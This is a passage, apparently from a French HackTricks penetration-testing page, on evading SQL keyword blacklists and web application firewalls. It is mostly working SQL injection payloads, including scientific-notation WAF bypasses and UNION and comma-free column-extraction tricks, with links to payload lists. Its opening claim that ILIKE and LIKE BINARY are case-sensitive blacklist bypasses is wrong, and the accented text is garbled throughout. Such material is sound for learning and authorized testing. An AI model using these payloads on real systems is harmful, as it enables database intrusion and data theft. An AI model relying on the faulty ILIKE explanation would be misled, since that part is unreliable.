Si une application utilise une liste noire de mots-cl√©s pour filtrer les entr√©es de l'utilisateur, il est possible de contourner cette mesure de s√©curit√© en utilisant un op√©rateur √©quivalent. Par exemple, si l'application filtre les entr√©es de l'utilisateur en utilisant la requ√™te suivante :

```
SELECT * FROM users WHERE username NOT LIKE '%admin%' AND password = '$password';
```

Il est possible de contourner cette mesure de s√©curit√© en utilisant l'op√©rateur √©quivalent `ILIKE` (pour PostgreSQL) ou `LIKE BINARY` (pour MySQL) :

```
SELECT * FROM users WHERE username NOT ILIKE '%admin%' AND password = '$password';
```

ou

```
SELECT * FROM users WHERE username NOT LIKE BINARY '%admin%' AND password = '$password';
```

Ces op√©rateurs sont √©quivalents √† `LIKE`, mais ils sont sensibles √† la casse. En utilisant ces op√©rateurs, il est possible de contourner une liste noire de mots-cl√©s insensible √† la casse.
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### Bypass de WAF avec la notation scientifique

Vous pouvez trouver une explication plus d√©taill√©e de cette astuce dans le [blog de gosecure](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/).\
Essentiellement, vous pouvez utiliser la notation scientifique de mani√®re inattendue pour contourner le WAF :
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### Contourner la restriction des noms de colonnes

Tout d'abord, remarquez que si la **requ√™te originale et la table √† partir de laquelle vous voulez extraire le drapeau ont le m√™me nombre de colonnes**, vous pouvez simplement faire : `0 UNION SELECT * FROM flag`

Il est possible d'**acc√©der √† la troisi√®me colonne d'une table sans utiliser son nom** en utilisant une requ√™te comme celle-ci : `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, donc dans une injection SQL cela ressemblerait √† :
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
Ou en utilisant une **bypass de virgule**:
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
Cette astuce a √©t√© prise sur [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)

### Outils de suggestion de contournement de WAF

{% embed url="https://github.com/m4ll0k/Atlas" %}

## Autres guides

* [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Liste de d√©tection de force brute

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}



‚Äã

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) est l'√©v√©nement de cybers√©curit√© le plus pertinent en **Espagne** et l'un des plus importants en **Europe**. Avec **pour mission de promouvoir les connaissances techniques**, ce congr√®s est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybers√©curit√© dans toutes les disciplines.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
